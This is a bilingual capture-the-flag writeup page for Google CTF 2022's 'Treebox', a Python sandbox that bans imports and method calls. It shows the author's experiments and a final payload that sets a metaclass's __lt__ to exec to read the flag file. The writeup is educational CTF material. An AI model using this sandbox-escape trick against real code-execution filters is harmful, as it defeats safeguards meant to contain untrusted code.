@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Treebox (Google Capture the Flag 2022) Writeup</title>
+<script src="../../../../common/common.js"></script>
+</head>
+<body>
+<language-selector data-langlist="日本語,ja,English,en"></language-selector>
+<h1>Treebox</h1>
+<div class="language-selector-ja" lang="ja">
+<p>
+TCPサーバの接続情報とファイルが与えられた。<br>
+このファイルを<common-tool data-lang="ja">7-Zip</common-tool>で開くと、ファイル <code>treebox.py</code> が得られた。
+</p><p>
+<code>treebox.py</code> を読むと、以下のことが読み取れた。
+</p>
+<ul>
+<li>flagはカレントディレクトリにあるファイル <code>flag</code> にある。</li>
+<li>入力されたPythonのプログラムを実行するが、<code>import</code>またはメソッドの呼び出しがある場合は実行しない。</li>
+</ul>
+<p>
+そこで、Pythonで直接メソッドの呼び出しを書かずにメソッドを呼び出す方法を探した。<br>
+すると、<a href="https://docs.python.org/ja/3.6/reference/datamodel.html#metaclasses">メタクラス</a>というものがあることがわかった。<br>
+インタラクティブモードで試してみると、クラス名だけでメタクラスに指定したクラスのインスタンスを作れることがわかった。
+</p>
+</div>
+<div class="language-selector-en" lang="en">
+<p>
+A file and information to connect to a TCP server were given.<br>
+Opening the file with <common-tool data-lang="en">7-Zip</common-tool>, I found a file <code>treebox.py</code>.
+</p><p>
+Reading <code>treebox.py</code>, I found these things:
+</p>
+<ul>
+<li>The flag is in the file <code>flag</code> in the current directory.</li>
+<li>It executes an entered Python program, but it won't execute the program if it contains <code>import</code> or method calls.</li>
+</ul>
+<p>
+Seeing this, I searched for ways to call methods without writing method calls directly.<br>
+As a result, I found <a href="https://docs.python.org/3.6/reference/datamodel.html#metaclasses">metaclasses</a>.<br>
+Trying on the interactive mode, I found that we can create an instance of a class specified as the metaclass using only a name of a class.
+</p>
+</div>
+<code-block data-extension="py">
+&gt;&gt;&gt; class test1:
+...  def __init__(self, a, b, c):
+...   pass
+...
+&gt;&gt;&gt; class test2(metaclass=test1):
+...  pass
+...
+&gt;&gt;&gt; test2
+&lt;__main__.test1 object at 0x0000013ED4A90D00&gt;
+&gt;&gt;&gt;
+</code-block>
+
+<p class="language-selector-ja" lang="ja">
+さらに、<a href="https://docs.python.org/ja/3.6/reference/datamodel.html#emulating-numeric-types">演算子から呼び出せる特殊メソッド</a>を用いて<code>exec</code>メソッドを呼び出すことを試みた。<br>
+一見第一引数の <code>self</code> が邪魔になりそうに思えるが、インタラクティブモードで試してみると <code>self</code> に相当する引数は渡らないことがわかった。
+</p>
+<p class="language-selector-en" lang="en">
+After that, I tried to call the <code>exec</code> method via <a href="https://docs.python.org/3.6/reference/datamodel.html#emulating-numeric-types">special methods that can be called from operators</a>.<br>
+The first argument <code>self</code> looked like an obstacle, but an experiment on the interactive mode revealed that no arguments that correspond to <code>self</code> are actually passed.
+</p>
+<code-block data-extension="py">
+&gt;&gt;&gt; class test(str):
+...  __neg__ = exec
+...
+&gt;&gt;&gt; t = test("print(1)")
+&gt;&gt;&gt; -t
+Traceback (most recent call last):
+  File "&lt;stdin&gt;", line 1, in &lt;module&gt;
+TypeError: exec expected at least 1 argument, got 0
+&gt;&gt;&gt;
+</code-block>
+
+<p class="language-selector-ja" lang="ja">
+これらを踏まえ、以下のプログラムを送信することでflagが得られた。
+</p>
+<p class="language-selector-en" lang="en">
+Based on these, I obtained the flag by sending this program.
+</p>
+<code-block data-extension="py">
+class ExecerMeta:
+  def __init__(self, a, b, c):
+    pass
+  __lt__ = exec
+
+class Execer(metaclass=ExecerMeta):
+  pass
+
+Execer &lt; "print(open('flag').read())"
+</code-block>
+
+<div class="flag">CTF{CzeresniaTopolaForsycja}</div>
+<hr>
+<writeup-by></writeup-by>
+<p>
+<a href="../../" class="language-aware-link">Google Capture the Flag 2022</a>
+</p>
+</body>
+</html>
